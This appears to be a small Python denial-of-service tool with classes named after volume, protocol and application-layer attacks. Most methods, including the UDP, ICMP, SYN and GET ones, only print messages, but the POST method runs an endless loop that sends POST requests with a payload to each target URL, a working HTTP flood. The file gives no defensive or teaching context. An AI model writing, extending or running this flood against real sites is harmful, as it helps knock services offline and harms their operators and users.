import requests as res
import time

class VolumeBasedAttack:
    def udp_flooding(self, i, vector, bye):
        print(f"UDP flooding attack {i} on {vector} with {len(bye)} bytes")

    def icmp(self, i, vector, bye):
        print(f"ICMP attack {i} on {vector} with {len(bye)} bytes")

class ProtocolAttack:
    def syn_flood(self, i, vector, bye):
        print(f"SYN flood attack {i} on {vector} with {len(bye)} bytes")

    def pof(self, i, vector, bye):
        print(f"POF attack {i} on {vector} with {len(bye)} bytes")

class ApplicationLayerAttack:
    def post(self, i, vector, bye):
        print(f"POST attack {i} on {vector} with {len(bye)} bytes")
        print("Using POST method to:", vector)
        print("You have 10 seconds to end the attack, press Ctrl+C or Ctrl+Z")
        time.sleep(10)
        while True:
            for target in vector:
                response = res.post(target, data=bye)
                print(response.text)

    def get(self, i, vector, bye):
        print(f"GET attack {i} on {vector} with {len(bye)} bytes")
